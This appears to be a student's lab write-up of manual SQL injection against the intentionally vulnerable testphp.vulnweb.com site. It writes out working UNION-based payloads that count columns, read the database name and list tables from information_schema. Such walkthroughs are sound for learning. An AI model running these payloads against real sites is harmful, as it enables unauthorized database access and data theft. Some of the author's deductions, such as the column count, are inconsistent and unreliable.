# First Injection and Exploring

To start, the lab's first step is to analyze what happens if you tried an injection like this.
```
http://testphp.vulnweb.com/artists.php?artist=1
```
So before I did the injection, I looked over what information is publicly out in the site just so I can tell any differences after injecting. <br />

So then first tried the commands on the second link from my resources.<br />
I added a ‘ <br />

Result: 
![image](https://github.com/user-attachments/assets/ab533ff6-7043-4fb4-9a2e-8a18aee6ef13)

Then I did: 
```
ORDER BY 1.
```
I did notice that the space in the URL translates to %20 but the site just went back to normal. <br />
![image](https://github.com/user-attachments/assets/96dd693d-4e1f-4868-bb68-4db854ee4c30)  <br />


removing the space result to an error again.<br />
![image](https://github.com/user-attachments/assets/c61e8fc5-c1f2-4926-bbbb-0cd2cf0ab335) <br />


kept doing ORDER BY, ‘til it errored on 4. So there’s only 4 columns on this table, the artists table.<br />
![image](https://github.com/user-attachments/assets/89245b7d-3fa1-4791-9e49-f8fd5743a812)

Then did <br />
```
union select 1,2,3
```
Which nothing showed up.<br />
![image](https://github.com/user-attachments/assets/34a255aa-c42f-4d73-aeb9-16bf52baf154)<br />

I changed artist=1 to a -1. <br />
This time it showed some numbers. It could mean two artists in a table or it’s the second field name. <br />
I am unsure yet. I moved on to the next steps.<br />
![image](https://github.com/user-attachments/assets/df809abf-ac27-476e-9d6b-79e67d2258d3)<br />

Getting the database name. 
```
http://testphp.vulnweb.com/artists.php?artist=-1%20union%20select%201,database(),3
```
![image](https://github.com/user-attachments/assets/099f5e37-97b0-48ca-ad27-4377dcb009ab) <br />


I tried to look for any tables in the database: 
```
http://testphp.vulnweb.com/artists.php?artist=-1 union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 0,1 
```
![image](https://github.com/user-attachments/assets/ce3fa655-dcab-4ded-9df1-65f222f5de95)<br />


Now, it showed a name “artists”. Assuming that’s the table name. and the artist is one of the field names.<br />

Then I changed limit 0,1 to 1,1 and continued changing it. <br />
```
union select 1,table_name,3 
from information_schema.tables 
where table_schema=database() limit 1,1 
```
table carts<br />
![image](https://github.com/user-attachments/assets/43b6052f-5d07-4eac-a9f7-7bc197fb59d1) <br /><br />

2,1 categ<br />
Table categ<br />
![image](https://github.com/user-attachments/assets/edb23b86-91cb-4838-9832-6331582f4b80) <br />

Then I jumped higher jumped higher. 5,1 pictures<br />
![image](https://github.com/user-attachments/assets/aab16d22-1624-4536-ae47-41c5c21b5c36)<br /><br />

9,1 was blank to I went back, 8,1 I also blank. So went further back to 7,1 which showed users. <br />
![image](https://github.com/user-attachments/assets/bd35f7db-328d-4253-bf98-38ffa8ea52a2)<br />
![image](https://github.com/user-attachments/assets/2500bf9c-b948-4c13-b7fb-48df18f86f7f)<br />

<b> So that concludes there are 8 tables.<br />
starting from 0,1-7,1.<br />
</b>

>[!NOTE]
> Next, Breaking more queries!





